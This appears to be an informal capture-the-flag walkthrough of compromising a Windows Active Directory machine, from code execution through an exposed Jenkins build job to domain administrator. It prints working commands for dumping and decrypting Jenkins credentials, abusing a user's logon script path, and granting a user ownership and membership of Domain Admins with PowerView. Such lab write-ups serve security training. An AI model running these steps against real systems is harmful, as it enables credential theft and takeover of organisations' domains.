i found a port 8080 which ran ==jenkins==, so no sqli was needed and i registered an account.

then we can do rce by creating a new item and choosing Freestyle project (as only this one was giving detailed output )

then we build trigger * * * * *Â  for every ==minute==

and build a ==windows batch file==

and write code with ==cmd /c whoami==

on github we found a repo for jennekins password decrypter

`https://github.com/hoto/jenkins-credentials-decryptor`

it required creds.xml,mster.key,hudson.util.secret,config.xml

`so we found these items on C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets`

to read it we did

`certutil -encode C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.. h.b64 & more .\h.b64` same for both files

and for config.xml which contains the hashed password it was on

`C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin\config.xml`

we ran the script and got password

we logged in using winrm adn got user.txt

we ran ==SharpHound== as it was AD machine as port 88 was internally open

sharphound said ==FORCECHANGE PASSWORD== and we ran the command to change the password for smith and used winrm as smith

then smith can log as maria if do ==GENERICWRITE== said by bloodhound

we added a ==spn== on maria and read the desktop data from where we got winrm password

```
echo "copy C:\users\maria\Desktop\Engines.xls  \programdata\" > cmd.ps1
echo "ls C:\users\maria\Desktop > \programdata\out" > cmd.ps1

Set-DomainObject -Identity maria -SET @{scriptpath='C:\\ProgramData\\cmd.ps1'}
```

we added maria to ==domain admins== adn now after logging out and in we are admins

```
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity maria
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights Al
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
```
